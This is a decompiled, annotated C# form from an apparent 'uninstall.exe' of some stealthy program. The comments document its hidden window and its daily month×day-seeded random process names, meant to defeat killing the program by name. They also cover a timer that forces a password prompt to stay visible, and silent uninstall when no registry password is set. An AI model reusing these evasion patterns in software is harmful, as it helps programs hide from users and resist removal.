using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WindowsApplication1.Internal;

namespace WindowsApplication1
{
	/// <summary>
	/// uninstall.exe 的启动窗体（主窗体）：一个 385×224、无边框、不进任务栏、启动即最小化的「隐身窗口」。
	/// 用户在屏幕上基本看不到它；它只在 Load 里做两件事：
	/// 拿「月×日」算出当日随机进程名与候选安装目录，
	/// 然后按「有没有设置卸载密码」分流——没密码就直接执行卸载、等 9 秒、结束进程；
	/// 有密码就弹出 Form2 让用户输入，并开 1 秒定时器保证 Form2 一直可见。
	/// </summary>
	/// <remarks>
	/// 敏感行为：
	/// 1) 隐蔽窗口：无边框 + ControlBox=false + ShowInTaskbar=false + WindowState=Minimized，卸载过程不露面；
	/// 2) 免密自动卸载：只要 HKCU\Software 值名 n 为空，无需任何交互就调用 卸载核心.执行卸载()，9 秒后 EndApp() 直接结束进程；
	/// 3) 强制保持前台：Timer2 每秒把 Form2 重新 Show() 一次，绕过「把密码窗最小化/藏起来」的规避手法；
	/// 4) 进程名随机化：以「月×日」为种子生成 5 个 i..r 字母的名字，让按固定进程名查杀失效。
	/// </remarks>
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public class Form1 : Form
	{
		// Token: 0x06000031 RID: 49 RVA: 0x000027D8 File Offset: 0x000009D8
		/// <summary>
		/// 构造函数：先挂 Load 处理器，再调用初始化控件（顺序为原版顺序）。
		/// </summary>
		public Form1()
		{
			base.Load += this.SearchReader;
			this.FillReader();
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002804 File Offset: 0x00000A04
		/// <summary>
		/// Load 处理器：先用「月×日」生成当日进程名（并改写窗体 Name），写进 MappingConfig 的静态字段，
		/// 然后 Show() 出这个隐身窗口，最后按 HKCU\Software 值名 n 有没有值分流：
		/// 有值 → 弹 Form2 要密码并开定时器；没值 → 直接执行卸载、等 9 秒、结束进程。
		/// </summary>
		/// <remarks>
		/// 原版整段在 VB 的 <c>On Error Resume Next</c> 之下（<c>ClearProjectError()</c> 开场、
		/// 状态号 num2 = 2..31、末尾按状态号分发的 catch，外层还套了一层 checked）：
		/// 每条语句出错都被吞掉继续下一条，所以这里逐条 try/catch；纯算术赋值不会抛异常，保持裸语句。
		/// 三处跳转的含义：IL_008F = 日期乘积为奇数时走的那套字母排列；IL_00D9 = 两种排列的汇合点；
		/// IL_0232 = 有密码分支，IL_0253 = 两个分支的统一出口。
		/// 第 2 步写下的 4 字母窗体名会紧接着被第 3 步算出的 5 字母进程名覆盖（属原版遗留代码），
		/// 但两次赋值都是真实副作用，故完整保留。种子就是「月×日」，所以进程名每天固定、完全可预测。
		/// </remarks>
		private void SearchReader(object sender, EventArgs e)
		{
			checked
			{
				int 日期乘积 = DateAndTime.Month(DateAndTime.Now) * DateAndTime.Day(DateAndTime.Now);
				int 模7 = 日期乘积 % 7;
				int 模9 = 日期乘积 % 9;
				int 模5 = 日期乘积 % 5;
				int 模3 = 日期乘积 % 3;
				if (日期乘积 % 2 == 0)
				{
					try
					{
						base.Name = Conversions.ToString(Strings.Chr(97 + 模7)) + Conversions.ToString(Strings.Chr(98 + 模9)) + Conversions.ToString(Strings.Chr(101 + 模5)) + Conversions.ToString(Strings.Chr(99 + 模3));
					}
					catch
					{
					}
				}
				else
				{
					try
					{
						base.Name = Conversions.ToString(Strings.Chr(97 + 模9)) + Conversions.ToString(Strings.Chr(98 + 模7)) + Conversions.ToString(Strings.Chr(101 + 模3)) + Conversions.ToString(Strings.Chr(99 + 模5));
					}
					catch
					{
					}
				}
				try
				{
					MappingConfig.containerConfig = base.Name;
				}
				catch
				{
				}
				try
				{
					MappingConfig.strategyConfig = base.Name + ".exe";
				}
				catch
				{
				}
				try
				{
					VBMath.Randomize((double)日期乘积);
				}
				catch
				{
				}
				long 随机数 = 0L;
				try
				{
					随机数 = (long)Math.Round(unchecked((double)VBMath.Rnd() * 100000.0 * 3.0 + 1.0));
				}
				catch
				{
				}
				string 进程名文本 = "";
				int 位数计数 = 1;
				do
				{
					long 字符码 = 随机数 % 10L + 105L;
					try
					{
						进程名文本 = Conversions.ToString(Strings.Chr((int)字符码)) + 进程名文本;
					}
					catch
					{
					}
					随机数 /= 10L;
					位数计数++;
				}
				while (位数计数 <= 5);
				try
				{
					MappingConfig.containerConfig = 进程名文本;
				}
				catch
				{
				}
				try
				{
					MappingConfig.strategyConfig = 进程名文本 + ".exe";
				}
				catch
				{
				}
				try
				{
					MappingConfig.m_ObserverConfig = "C:\\Program Files (x86)\\" + Strings.Mid(进程名文本, 2, 4);
				}
				catch
				{
				}
				try
				{
					base.Show();
				}
				catch
				{
				}
				string 密码哈希 = "";
				try
				{
					密码哈希 = Conversions.ToString(MappingConfig.SortReader(Registry.CurrentUser, "Software", "n", ""));
				}
				catch
				{
				}
				if (Operators.CompareString(密码哈希, "", false) != 0)
				{
					try
					{
						Test.CallReader.Form2.Show();
					}
					catch
					{
					}
					try
					{
						this.Timer2.Enabled = true;
					}
					catch
					{
					}
				}
				else
				{
					try
					{
						MappingConfig.PopReader();
					}
					catch
					{
					}
					try
					{
						Thread.Sleep(9000);
					}
					catch
					{
					}
					try
					{
						ProjectData.EndApp();
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000235F File Offset: 0x0000055F
		/// <summary>
		/// Timer2 的 Tick（1 秒一次）：Form2 不可见就再 Show() 一次——防止用户把密码窗体最小化或藏起来，
		/// 让卸载密码框始终挡在前面。
		/// </summary>
		private void PublishReader(object sender, EventArgs e)
		{
			if (!Test.CallReader.Form2.Visible)
			{
				Test.CallReader.Form2.Show();
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002B5C File Offset: 0x00000D5C
		/// <summary>
		/// 设计器生成的释放逻辑：disposing 为真时先释放组件容器，再调用基类 Dispose。
		/// </summary>
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.组件容器 != null)
				{
					this.组件容器.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002B9C File Offset: 0x00000D9C
		/// <summary>
		/// VB 的 InitializeComponent：1 秒定时器 + 385×224 无边框、无控制框、不进任务栏、标题「卸载」、启动即最小化。
		/// </summary>
		private void FillReader()
		{
			this.组件容器 = new Container();
			this.Timer2 = new global::System.Windows.Forms.Timer(this.组件容器);
			base.SuspendLayout();
			this.Timer2.Interval = 1000;
			base.AutoScaleDimensions = new SizeF(6f, 12f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(385, 224);
			base.ControlBox = false;
			base.FormBorderStyle = FormBorderStyle.None;
			base.Name = "Form1";
			base.ShowInTaskbar = false;
			this.Text = "卸载";
			base.WindowState = FormWindowState.Minimized;
			base.ResumeLayout(false);
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000036 RID: 54 RVA: 0x00002381 File Offset: 0x00000581
		// (set) Token: 0x06000037 RID: 55 RVA: 0x00002C48 File Offset: 0x00000E48
		/// <summary>
		/// 1 秒定时器（Timer2）。setter 在换实例时同步退订/订阅 Tick（指向 PublishReader）。
		/// </summary>
		internal virtual global::System.Windows.Forms.Timer Timer2
		{
			[CompilerGenerated]
			get
			{
				return this._定时器实例;
			}
			[CompilerGenerated]
			set
			{
				EventHandler eventHandler = new EventHandler(this.PublishReader);
				global::System.Windows.Forms.Timer timer = this._定时器实例;
				if (timer != null)
				{
					timer.Tick -= eventHandler;
				}
				this._定时器实例 = value;
				timer = this._定时器实例;
				if (timer != null)
				{
					timer.Tick += eventHandler;
				}
			}
		}

		// Token: 0x0400000F RID: 15
		/// <summary>组件容器（Designer 的 components），Dispose 时一并释放。</summary>
		private IContainer 组件容器;

		// Token: 0x04000010 RID: 16
		/// <summary>1 秒定时器（Timer2）的后备字段。</summary>
		[CompilerGenerated]
		[AccessedThroughProperty("Timer2")]
		private global::System.Windows.Forms.Timer _定时器实例;
	}
}
